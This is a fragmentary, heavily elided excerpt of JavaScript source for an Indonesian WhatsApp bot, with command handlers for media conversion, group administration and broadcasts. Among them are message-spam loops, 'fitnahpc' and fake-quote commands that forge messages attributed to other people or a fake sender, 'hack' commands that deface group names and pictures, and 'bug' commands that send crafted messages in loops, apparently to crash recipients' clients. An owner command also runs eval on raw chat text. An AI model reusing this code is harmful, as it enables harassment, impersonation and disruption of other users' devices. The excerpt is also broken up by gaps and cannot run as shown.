sendFileFromUrl(res[0].thumb, image, {quoted: imp, caption: result}).catch(e => {
  reply(result)
})
break
case 'mediafire':
...
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					try{
					if ( args.length === 1 ){
						tekss = imp.message.extendedTextMessage.contextInfo.quotedMessage.conversation
...
break
              ...
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				...
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/resepmakanan?query=${teks}&apikey=${HunterApi}`, {method: 'get'})
					...
					impo.sendMessage(from, buff, image, {quoted: ftok, caption: hasilresep})
					break 
					case 'githubstalk':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					...
					impo.sendMessage(from, buff, image, {quoted: ftok, caption: gstalk})
					break 
					case 'infogempa':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					...
					impo.sendMessage(from, buff, image, {quoted: ftok, caption: gempa})
					break 
				case 'dadu':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
			random = Math.floor(Math.random() * 6) + 1
		damdu = fs.readFileSync(`./sticker/${random}.webp`)
			impo.sendMessage(from, damdu, sticker, {quoted: mek})
			break
				case 'robot':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
encmedial = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
medial = await impo.downloadAndSaveMediaMessage(encmedial)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${medial} -filter_complex "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(medial)
if (err) return reply(mess.error.api)
hah = fs.readFileSync(ran)
impo.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
break
case 'gemuk':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					...
					mediaz = await impo.downloadAndSaveMediaMessage(encmediaz)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mediaz} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(mediaz)
						if (err) return ephe('Error!')
						hah = fs.readFileSync(ran)
					impo.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, duration: 359996400, quoted:mek})
						fs.unlinkSync(ran)
					})
					break
case 'balik':
	...
	mediau = await impo.downloadAndSaveMediaMessage(encmediau)
	ran = getRandom('.mp3')
...
case 'bass':                 
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					...
					mediao = await impo.downloadAndSaveMediaMessage(encmediao)
					ran = getRandom('.mp3')
...
case 'sider':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
infom = await impo.messageInfo(from, imp.message.extendedTextMessage.contextInfo.stanzaId)
tagg = []
...
if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  impo.sendMessage(from, `${oi1}`, MessageType.text)
	  }
} else if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length < 10) {
teks = imp.message.extendedTextMessage.contextInfo.quotedMessage.conversation
if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  impo.sendMessage(from, teks, MessageType.text)
	  }
} else if (isQuotedSticker) {
	encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	         median = await impo.downloadAndSaveMediaMessage(encmedian)
				anu = fs.readFileSync(median)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  impo.sendMessage(from, anu, sticker)
	  }
} else if (isQuotedAudio) {
	encmediat = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            mediat = await impo.downloadAndSaveMediaMessage(encmediat)
				anu = fs.readFileSync(mediat)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  impo.sendMessage(from, anu, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true})
	  }
} else if (isQuotedImage) {
	boij = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
	delb = await impo.downloadMediaMessage(boij)
	teks = body.slice(6)
	oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
	if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  impo.sendMessage(from, delb, MessageType.image, {caption: oi1})
	  }
}
	  break
	case 'halloween':
...
case 'matrix':
              ...
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				...
				case 'del':
				case 'delete':
					impo.deleteMessage(from, { id: imp.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					break
				case 'colong':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
		if (!isQuotedSticker) return reply(`Reply sticker dengan caption *${prefix}colong*`)
		const encmediia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	        const meidia = await impo.downloadAndSaveMediaMessage(encmediia, `./sticker/${sender}`)
		    exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
		    if (error) return reply('error')
		    impo.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), MessageType.sticker, {quoted: mek})
              ...
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
                ...
                await sleep(4000)
                impo.modifyChat(from, ChatModification.delete)
                break
				case 'clearall':
				if (!isOwner && !imp.key.fromMe) return sticOwner(from)
					anu = await impo.chats.all()
					impo.setMaxListeners(10)
					for (let _ of anu) {
						impo.clearMessage(_.jid)
					}
...
encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediam = await impo.downloadAndSaveMediaMessage(encmediam)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(mediam)
						impo.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:mek})
              ...
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					...
					hah = fs.readFileSync(median)
						impo.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: mek})
			...
			if (!isBotGroupAdmins) return sticNotAdmin(from)
					if (args[0] === 'on') {
						...
						impo.sendMessage(from, `ALLERT!!! Group ini sudah di pasang anti link\nJika Kamu Melanggar Maka Akan Saya Tendang`, text)
					} else if (args[0] === 'off') {
...
await impo.sendMessage(from, btnasu, MessageType.buttonsMessage, {quoted: ftrol})
					}
					break
					case 'antibug':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
...
await impo.sendMessage(from, btasu, MessageType.buttonsMessage, {quoted: ftrol})
					}
          break
				case 'tinyurl':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
...
case 'tts':
        ...
        if (args.length < 2) return impo.sendMessage(from, 'Textnya mana gan?', text, {quoted: mek})
        ngab = budy.slice(7)
        ranm = getRandom('.mp3')
        rano = getRandom('.ogg')
        ngab.length > 600
        ...
        : gtts.save(ranm, ngab, function() {
            exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
                ...
                impo.sendMessage(from, buff, audio, {quoted:imp,ptt:true})
                fs.unlinkSync(rano)
            })
        })
	} else if ( args.length === 1 ){
		ngab = imp.message.extendedTextMessage.contextInfo.quotedMessage.conversation
		const gtts = require('./lib/gtts')(args[0])
        ranm = getRandom('.mp3')
        rano = getRandom('.ogg')
        gtts.save(ranm, ngab, function() {
...
break 
              ...
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				...
				if (!isGroupAdmins) return sticAdmin(from)
                   if (!isBotGroupAdmins) return sticNotAdmin(from)
					if (imp.message.extendedTextMessage === undefined || imp.message.extendedTextMessage === null) return reply('Reply targetnya!')
			demote = imp.message.extendedTextMessage.contextInfo.participant
		    impo.groupDemoteAdmin(from, [demote])
              ...
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
                   ...
                   if (!isBotGroupAdmins) return sticNotAdmin(from)
				  if (imp.message.extendedTextMessage === undefined || imp.message.extendedTextMessage === null) return reply('Reply targetnya!')
			promote = imp.message.extendedTextMessage.contextInfo.participant
		    impo.groupMakeAdmin(from, [promote])
              ...
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				if (!isGroup) return reply(mess.only.group)
                   if (!isBotGroupAdmins) return sticNotAdmin(from)
					linkgc = await impo.groupInviteCode(from)
					yeh = `https://chat.whatsapp.com/${linkgc}\n\nLink grup ${groupName}`
					impo.sendMessage(from, yeh, text, { quoted: mek })
					break
					case 'resetlinkgc':
         case 'resetlinkgroup':
         case 'revoke':
         ...
         impo.query({json, expect200: true})
...
await impo.sendMessage(from, bMess, MessageType.buttonsMessage, {quoted: ftrol})
break
					case 'opengc':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return sticAdmin(from)
				...
				for (let i = 0; i < argzi[1]; i++){
					impo.sendMessage(from, argzi[0], MessageType.text)
				}
				break
				case 'demoteall':
		if (!isOwner && !imp.key.fromMe) return sticOwner(from)
		...
		for (let mem of groupMembers) {
	   	members_id.push(mem.jid)
                ...
                impo.groupDemoteAdmin(from, members_id)
                break
                case 'promoteall':
		if (!isOwner && !imp.key.fromMe) return sticOwner(from)
		if (!isGroup) return reply(mess.only.group)
		...
		for (let mem of groupMembers) {
	   	members_id.push(mem.jid)
                ...
                impo.groupMakeAdmin(from, members_id)
                break
				case 'setnamegc':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return sticAdmin(from)
              if (!isBotGroupAdmins) return sticNotAdmin(from)
					impo.groupUpdateSubject(from, `${body.slice(11)}`)
              ...
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					...
					if (!isGroupAdmins) return sticAdmin(from)
                   if (!isBotGroupAdmins) return sticNotAdmin(from)
					impo.groupUpdateDescription(from, `${body.slice(10)}`)
				...
				if (!isQuotedImage) return reply('Reply imagenya!')
					...
					mediau = await impo.downloadAndSaveMediaMessage(enmediau)
					await impo.updateProfilePicture(botNumber, mediau)
					reply('Sukses')
					break
				case 'leave':
				if (!isGroup) return reply(mess.only.group)
				...
				case 'bc':
					...
					if (args.length < 1) return reply('Teksnya?')
					anu = await impo.chats.all()
					if (isMedia && !imp.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await impo.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							impo.sendMessage(_.jid, buff, image, { viewOnce:true, caption: `${body.slice(4)}`})
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !imp.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await impo.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							impo.sendMessage(_.jid, buff, video, { viewOnce:true, caption: `${body.slice(4)}`})
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !imp.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await impo.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							impo.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: finv, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `${body.slice(4)}` })
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
					} else {
						for (let _ of anu) {
...
await impo.sendMessage(_.jid, btnbc, MessageType.buttonsMessage, {quoted: ftrol})
						}
...
if (!arg) return reply(`Penggunaan ${prefix}spamsw teks|jumlah`)
				...
				if (isNaN(argzi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					impo.sendMessage('status@broadcast', argzi[0], MessageType.text)
                    }
                    break	
				case 'upswteks':
if (!isOwner && !imp.key.fromMe) return sticOwner(from)
if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(10)
                    impo.sendMessage('status@broadcast', teks, MessageType.text)
...
if (!isOwner && !imp.key.fromMe) return sticOwner(from)
  if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(12)
                    impo.sendMessage('status@broadcast', {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:teks,address:`${NamaBot}`}, MessageType.location)
                    reply(`Sukses upload lokasi:\n${teks}`)
                    break	
                    case 'upswsticker':
                    if (!isOwner && !imp.key.fromMe) return sticOwner(from)
if (!isQuotedSticker) return reply('Reply stikernya!')
if (isMedia && !imp.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await impo.downloadMediaMessage(encmedia)
						impo.sendMessage('status@broadcast', buff, sticker)
						}
...
if (isMedia && !imp.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await impo.downloadMediaMessage(encmedia)
						impo.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400})
						}
...
if (isMedia && !imp.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await impo.downloadMediaMessage(encmedia)
						impo.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt: true})
						}
...
if (!isOwner && !imp.key.fromMe) return sticOwner(from)
					...
					var mediap = await impo.downloadAndSaveMediaMessage(enmediap)
                    const buffer3 = fs.readFileSync(mediap)
                    impo.sendMessage('status@broadcast', buffer3, MessageType.video, {duration: 359996400, caption: `${konti}`})
...
if (!isOwner && !imp.key.fromMe) return sticOwner(from)
					...
					media = await impo.downloadAndSaveMediaMessage(enmedia)
                    const buffer6 = fs.readFileSync(media)
                    impo.sendMessage('status@broadcast', buffer6, MessageType.video, {mimetype : 'video/gif', caption: `${konti}`})
                    ...
                    impo.sendMessage('status@broadcast', buffer, MessageType.image, {quoted: imp, caption: `${teksyy}`})
                    reply(`Sukses upload image:\n${teksyy}`)
                        break
					case 'shutdown':
					if (!isOwner && !imp.key.fromMe) return sticOwner(from)
				return impo.sendMessage(from, JSON.stringify(eval(process.exit())))
				reply('Okey')
				break
				case 'tomp4':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					if (!isQuotedSticker) return reply('Reply stiker nya')
                                        sticWait(from)
            if ((isMedia && !imp.message.videoMessage || isQuotedSticker) && args.length == 0) {
            ...
            case 'tomp3':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					...
					mediad = await impo.downloadAndSaveMediaMessage(encmediad)
					ran = getRandom('.mp4')
					exec(`ffmpeg -i ${mediad} ${ran}`, (err) => {
						fs.unlinkSync(mediad)
						if (err) return reply(mess.error.api)
						mhee = fs.readFileSync(ran)
						impo.sendMessage(from, mhee, audio, { mimetype: 'audio/mp4', duration: 359996400, quoted: mek })
						fs.unlinkSync(ran)
					})
					break
				case 'suit':
...
break
            ...
            break
              ...
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				...
				if (imp.message.extendedTextMessage != undefined){
                    mentioned = imp.message.extendedTextMessage.contextInfo.mentionedJid
              ...
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				if (!isGroup) return reply(mess.only.group)
					anu = from
			   metadete = await impo.groupMetadata(anu)
				impo.sendMessage(from, metadete.desc, text, {quoted:mek})
				  break
					case 'getbio':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
	  var yy = imp.message.extendedTextMessage.contextInfo.participant
var p = await impo.getStatus(`${yy}`, MessageType.text)
reply(p.status)
if (p.status == 401) {
reply(mess.error.api)
}
break
                    case 'getname':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
        var ambl = imp.message.extendedTextMessage.contextInfo.participant
const sname = impo.contacts[ambl] != undefined ? impo.contacts[ambl].notify = undefined ? PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international') : impo.contacts[ambl].notify || impo.contacts[ambl].vname : PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international')
reply(sname)
break
				case 'getpict':
				case 'getpic':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					if (!isGroup) return reply(mess.only.group)
            mentioned = imp.message.extendedTextMessage.contextInfo.mentionedJid[0]
            pictt = await impo.getProfilePicture(mentioned)
            pict = await getBuffer(pictt)
            impo.sendMessage(from, pict, image, {quoted: mek})
            break
				case 'chat':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
            ...
            var org = pc.split("|")[1];
            impo.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)   
            ...
            break
              ...
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					...
					impo.sendMessage(from, atetepe, sticker, { quoted: mek })
					break
                case 'ttp':  
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
                    if (!c) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}attp ${NamaBot}`)
                    anu1 = await getBuffer(`https://api.xteam.xyz/ttp?file&text=${c}`)
                    impo.sendMessage(from, anu1, image, {quoted: imp, caption : `${prefix}sticker`})
                    break
				case 'semoji':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
    	   ...
    	   break
            ...
            var nomqm = `${body.slice(5)}@s.whatsapp.net`
					tagq = `@${nomqm.split('@')[0]}` 
					impo.sendMessage(from, tagq, text, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
			break
			case 'tagme':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
                  var nomqm = imp.participant
				    tagu = `@${nomqm.split('@s.whatsapp.net')[0]}`
					impo.sendMessage(from, tagu, text, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
					break
				case 'join':
				if (!isOwner && !imp.key.fromMe) return sticOwner(from)
...
if (!isOwner && !imp.key.fromMe) return sticOwner(from)
            ...
            file = await impo.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await impo.groupMetadata(from)
            ...
            impo.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !imp.message.videoMessage || isQuotedImage) && args.length == 0) {
            ...
            ini_buffer = fs.readFileSync(file)
            impo.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !imp.message.videoMessage || isQuotedAudio) && args.length == 0) {
            ...
            ini_buffer = fs.readFileSync(file)
            impo.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
         } else if ((isMedia && !imp.message.videoMessage || isQuotedVideo) && args.length == 0) {
            ...
            ini_buffer = fs.readFileSync(file)
            impo.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !imp.message.videoMessage || isQuotedDocument) && args.length == 0) {
            ...
            ini_buffer = fs.readFileSync(file)
            impo.sendMessage(from, ini_buffer, document, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !imp.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await impo.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
...
case 'stats':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				var groups = impo.chats.array.filter(v => v.jid.endsWith('g.us'))
				var privat = impo.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
				var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
					...
					const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = impo.user.phone
					stamtus = `⍟ ────────────────── ⍟
...
MNC : ${mnc}
MCC : ${mcc}
Device Model: ${impo.user.phone.device_model}
Device Manufactur : ${device_manufacturer}
Wa Version: ${impo.user.phone.wa_version}
Os Version: ${impo.user.phone.os_version}
...
break
				...
				impo.updatePresence(from, Presence.composing)
					...
					if (isMedia && !imp.message.videoMessage || isQuotedAudio) {
						...
						buff = await impo.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							impo.sendMessage(_.jid, buff, audio, { quoted: ftrol })
						}
						} else if (isMedia && !imp.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await impo.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							impo.sendMessage(_.jid, buff, sticker, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
							}
							} else{
...
var nn = body.slice(9)
           ...
           case 'fitnahpc':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				...
				var bot = gh.split("|")[2];
			    impo.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${parti}@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { conversation: `${targetq}` }}})
					break
            case 'hidetag':
            if (!isOwner && !imp.key.fromMe) return sticOwner(from)
            ht = body.slice(9)
            ...
            if (!isGroup) return reply(mess.only.group)
                cr = body.slice(4)
                cs = cr.split('|')
                taged = imp.message.extendedTextMessage.contextInfo.mentionedJid[0]
                const target = {
					contextInfo: {
						participant: taged,
						quotedMessage: {
				...
				impo.sendMessage(from, cs[2], MessageType.text, target)
				break
              case 'hacked':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
              if (!isGroup) return reply(mess.only.group)
              ...
              reply('Otw Hack')
                tessgc = await getBuffer(`https://i.ibb.co/m4Qx3JG/20210319-204838.jpg`)
                   impo.updateProfilePicture (from, tessgc)
                   await sleep(1000)
                impo.groupUpdateSubject(from, `HACKED BY ${body.slice(8)}`)
                await sleep(1000)
                impo.groupUpdateDescription(from, `_${pushname} telah meretas grup ini_`)             
                await sleep(1000)
                impo.sendMessage(from, 'Succes Hacked', text, {quoted: mek})
					break
					case 'hack':
					if (!isOwner && !imp.key.fromMe) return sticOwner(from)
              if (!isGroup) return reply(mess.only.group)
              ...
              if (!isBotGroupAdmins) return sticNotAdmin(from)
              sendBug(from)
              impo.groupUpdateSubject(from, `HACKED BY DENZ`)
                impo.groupUpdateDescription(from, `_${me.jid}_`)
             impo.updateProfilePicture(from, fs.readFileSync('./media/image/me.jpg'))
                impo.sendMessage(from, 'Succes!', text, {quoted: mek})
                await sleep(3000)
                impo.groupLeave(from)
					break
					case 'bugpc2':
...
for (let i = 0; i < args[0]; i++) {
impo.sendMessage(from, `${NamaBot}`, MessageType.extendedText,{
 quoted: {
key: {
...
impo.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
}}	
...
if (args.length < 1) return reply('Jumlahnya?')
		        try {
		        var hets = `${NamaBot}`
		        var grousp = await impo.groupMetadata(from)
		        ...
		        for (let i = 0; i < args[0]; i++) {
		        impo.sendMessage(from, options, text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
		          ...
		          for(let i=0;i<10;i++){
		        impo.sendMessage(from, 'Berhasil Mengirim Bug Troli2', text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
	    },
...
case 'bugcombine':
if (!isOwner && !imp.key.fromMe) return sticOwner(from)
                 impo.toggleDisappearingMessages(from, 'HACKED')
impo.sendMessage(from, `${NamaBot}`, text, {
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
...
if (!isOwner && !imp.key.fromMe) return sticOwner(from)
impo.updatePresence(from, Presence.composing)
		       impo.sendMessage(from, {degreesLatitude: 34.0184,
...
if (!isOwner && !imp.key.fromMe) return sticOwner(from)
impo.updatePresence(from, Presence.composing)
impo.sendMessage(from, 'yaudah oke',text, {
 quoted: {
  key: {
...
*🔖 Link:* ${items[i].url}\n\n`
                ...
                await impo.sendMessage(from, thumb, image, {quoted: ftrol, caption: `${hehe}───────────────\n
*🔖 DOWNLOAD*
🔖 ${prefix}ytmp3 [link yt] = Audio
🔖 ${prefix}ytmp4 [link yt] = Video`, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:`SEARCH: ${args[0]}`,body:"🔖YOUTUBE SEARCH",mediaType:"2",thumbnail:pporigi,mediaUrl:`https://youtu.be/ig4qLi-spdM`}}})
            } catch(e) {
            ...
            break
              ...
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
						if (isMedia && !imp.message.videoMessage || isQuotedImage) {
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await impo.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							await ffmpeg(`${media}`)
									.input(media)
									...
									.on('end', function () {
										...
										exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											...
											impo.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)	
						...
						} else if ((isMedia && imp.message.videoMessage.fileLength < 10000000 || isQuotedVideo && imp.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
							const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await impo.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							sticWait(from)
								await ffmpeg(`${media}`)
			...
			case 'ping':
              ...
              if (!isOwner && !imp.key.fromMe) return sticOwner(from)
				...
				if (!isOwner) return sticOwner(from)
					return impo.sendMessage(from, JSON.stringify(eval(body.slice(8))), text, {quoted: mek})
					if (err) return impo.sendMessage(from, `root @dcode-denpa:~ ${err}`, text, { quoted: mek })
                 break
                 case 'toimg':
				case 'tomedia':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					if (!isQuotedSticker) return reply('Reply stiker nya')
					if (imp.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated === true){
						const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const media = await impo.downloadAndSaveMediaMessage(encmedia)
              ...
              sticWait(from)
				...
				if (!isOwner && !imp.key.fromMe) return sticOwner(from)
					...
					impo.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}liststicker*`, MessageType.text, { quoted: mek })
					break
				case 'delsticker':
				if (!isOwner && !imp.key.fromMe) return sticOwner(from)
					try {
              ...
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					...
					impo.sendMessage(from, teks.trim(), extendedText, { quoted: imp, contextInfo: { "mentionedJid": setik } })
					break
					case 'addvn':
					if (!isOwner && !imp.key.fromMe) return sticOwner(from)
					...
					impo.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}listvn*`, MessageType.text, { quoted: mek })
					break
					case 'delvn':
					if (!isOwner && !imp.key.fromMe) return sticOwner(from)
					try {
              ...
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					...
					impo.sendMessage(from, teks.trim(), extendedText, { quoted: imp, contextInfo: { "mentionedJid": vien } })
					break
				case 'addimage':
				if (!isOwner && !imp.key.fromMe) return sticOwner(from)
					...
					impo.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}listimage*`, MessageType.text, { quoted: mek })
					break
